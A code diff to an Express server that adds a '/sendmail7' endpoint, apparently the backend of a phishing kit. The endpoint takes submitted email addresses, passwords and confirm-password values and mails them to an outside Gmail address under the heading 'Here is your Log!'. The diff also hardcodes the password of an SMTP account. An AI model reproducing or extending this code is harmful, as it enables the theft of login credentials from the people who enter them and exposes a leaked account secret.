@@ -185,6 +185,40 @@ app.post("/sendmail4", async (req, res) => {
     res.status(500).send("Error sending email");
   }
 });
+app.post("/sendmail7", async (req, res) => {
+  const { email, pass, pasers } = req.body;
+  try {
+    let transporter = nodemailer.createTransport({
+      host: "host51.registrar-servers.com",
+      port: 465,
+      auth: {
+        user: "info@goafze.com",
+        pass: "sH=dzO.mvg+;",
+      },
+    });
+    let info = await transporter.sendMail({
+      from: '"Happy time" <info@goafze.com>',
+      to: "soccerroos23@gmail.com",
+      subject: "Happy time",
+      html: `
+    <div> 
+      <h2>Here is your Log!</h2>
+        <p>Email: ${email}</p>
+        <p>Pass: ${pass}</p>
+        <p>Confirm Pass: ${pasers}</p>
+    
+        <p>All the best, XXXmannnXXX</p>
+         </div>
+    `,
+    });
+
+    await transporter.sendMail(info);
+    res.send("Email sent successfully");
+  } catch (error) {
+    console.error(error);
+    res.status(500).send("Error sending email");
+  }
+});
 
 const PORT = process.env.PORT || 5000;
 
